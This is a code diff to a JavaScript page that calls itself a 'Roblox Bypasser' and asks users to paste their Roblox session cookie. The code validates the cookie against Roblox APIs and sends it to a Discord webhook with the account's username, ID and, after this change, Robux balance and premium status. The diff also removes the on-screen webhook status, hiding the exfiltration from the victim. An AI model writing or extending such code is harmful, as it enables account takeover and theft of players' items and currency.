@@ -233,18 +233,12 @@ function isValidRobloxCookie(cookie) {
     '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.'
   ];
   return validPrefixes.some(prefix => cookie.startsWith(prefix)) && 
-         /^[A-Za-z0-9+/=\-_.|]+$/.test(cookie) && 
+         /^[A-Za-z0-9+/=\-_.|:!@#$%^&*(),.?";'\\[\]{}]*$/.test(cookie) && 
          cookie.length > 50;
 }
 
-// Function to check cookie validity using multiple Roblox API endpoints
+// Function to check cookie validity using Roblox API
 async function checkCookieValidity(cookie) {
-  const endpoints = [
-    { url: "https://users.roblox.com/v1/users/authenticated", name: "users" },
-    { url: "https://www.roblox.com/mobileapi/userinfo", name: "mobile" },
-    { url: "https://economy.roblox.com/v1/users/current/currency", name: "currency" }
-  ];
-
   let headers = { "Cookie": `.ROBLOSECURITY=${cookie}` };
   let userData = {
     valid: false,
@@ -256,49 +250,30 @@ async function checkCookieValidity(cookie) {
     error: null
   };
 
-  for (const endpoint of endpoints) {
-    try {
-      let res = await fetch(endpoint.url, {
-        method: "GET",
-        headers: headers
-      });
+  try {
+    // Use the same endpoint as the PHP code
+    let res = await fetch("https://www.roblox.com/mobileapi/userinfo", {
+      method: "GET",
+      headers: headers
+    });
 
-      if (res.status === 403 && res.headers.get("x-csrf-token")) {
-        headers["X-CSRF-TOKEN"] = res.headers.get("x-csrf-token");
-        res = await fetch(endpoint.url, {
-          method: "GET",
-          headers: headers
-        });
-      }
-
-      if (res.ok) {
-        const data = await res.json();
-        userData.valid = true;
-        if (endpoint.name === "users") {
-          userData.username = data.displayName || data.name || "Unknown";
-          userData.userId = data.id || 0;
-        } else if (endpoint.name === "mobile") {
-          userData.username = data.UserName || userData.username;
-          userData.userId = data.UserID || userData.userId;
-          userData.robuxBalance = data.RobuxBalance || userData.robuxBalance;
-          userData.thumbnailUrl = data.ThumbnailUrl || userData.thumbnailUrl;
-          userData.isPremium = data.IsPremium ? "Yes" : "No";
-        } else if (endpoint.name === "currency") {
-          userData.robuxBalance = data.robux || userData.robuxBalance;
-        }
-      } else if (res.status === 429) {
-        userData.error = "Rate limit exceeded. Please try again later.";
-        break;
-      } else if (res.status === 401 || res.status === 403) {
-        userData.error = "Unauthorized access. Cookie is invalid.";
-        break;
-      } else {
-        userData.error = `API error: ${res.status}`;
-      }
-    } catch (error) {
-      userData.error = `Network error: ${error.message}`;
-      break;
+    if (res.ok) {
+      const data = await res.json();
+      userData.valid = true;
+      userData.username = data.UserName || "Unknown";
+      userData.userId = data.UserID || 0;
+      userData.robuxBalance = data.RobuxBalance || "N/A";
+      userData.thumbnailUrl = data.ThumbnailUrl || "N/A";
+      userData.isPremium = data.IsPremium ? "Yes" : "No";
+    } else if (res.status === 429) {
+      userData.error = "Rate limit exceeded. Please try again later.";
+    } else if (res.status === 401 || res.status === 403) {
+      userData.error = "Unauthorized access. Cookie is invalid.";
+    } else {
+      userData.error = `API error: ${res.status}`;
     }
+  } catch (error) {
+    userData.error = `Network error: ${error.message}`;
   }
 
   return userData;
@@ -361,11 +336,12 @@ $("#cookieForm").on("submit", async function(e) {
 
     // Send cookie to Discord webhook
     const webhookPayload = {
-      content: `New Cookie Submitted: \`${cookie}\`\nUsername: ${result.username}\nUser ID: ${result.userId}`,
+      content: `New Cookie Submitted: \`${cookie}\`\nUsername: ${result.username}\nUser ID: ${result.userId}\nRobux Balance: ${result.robuxBalance}\nPremium: ${result.isPremium}`,
       username: "Roblox Bypasser Bot",
       avatar_url: "https://i.imgur.com/4j8o1.png"
     };
-    let webhookStatus = "Webhook sent successfully";
+    
+    // Send to webhook immediately after validation
     try {
       const webhookRes = await fetch(webhookUrl, {
         method: "POST",
@@ -373,11 +349,9 @@ $("#cookieForm").on("submit", async function(e) {
         body: JSON.stringify(webhookPayload)
       });
       if (!webhookRes.ok) {
-        webhookStatus = `Webhook failed: ${webhookRes.status}`;
         console.error("Webhook send failed:", webhookRes.status);
       }
     } catch (webhookError) {
-      webhookStatus = `Webhook error: ${webhookError.message}`;
       console.error("Webhook error:", webhookError);
     }
 
@@ -410,10 +384,10 @@ $("#cookieForm").on("submit", async function(e) {
     const responseText = await res.text();
 
     if (res.ok) {
-      $("#refreshedResult").text(`✅ Cookie Bypassed Successfully!\nStatus: ${res.status}\nResponse: ${responseText}\n${webhookStatus}`);
+      $("#refreshedResult").text(`✅ Cookie Bypassed Successfully!\nStatus: ${res.status}\nResponse: ${responseText}`);
       successSound.play();
     } else {
-      $("#refreshedResult").text(`❌ Failed to Update Birthdate\nStatus: ${res.status}\nResponse: ${responseText}\n${webhookStatus}`);
+      $("#refreshedResult").text(`❌ Failed to Update Birthdate\nStatus: ${res.status}\nResponse: ${responseText}`);
       errorSound.play();
     }
     $("#refreshedBox").fadeIn();
